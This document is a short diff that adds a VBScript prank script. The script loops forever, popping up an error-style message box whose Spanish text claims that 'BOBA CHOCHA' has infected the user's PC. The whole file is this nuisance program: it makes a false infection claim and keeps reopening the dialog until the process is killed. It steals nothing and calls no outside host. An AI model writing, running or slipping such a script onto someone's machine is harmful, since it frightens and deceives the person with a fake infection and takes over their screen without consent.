@@ -1,0 +1,3 @@
+do
+x=msgbox("BOBA CHOCHA HA INFECTADO TU PC JAJAJAJA", 0+16, "BOBA CHOCHA")
+loop
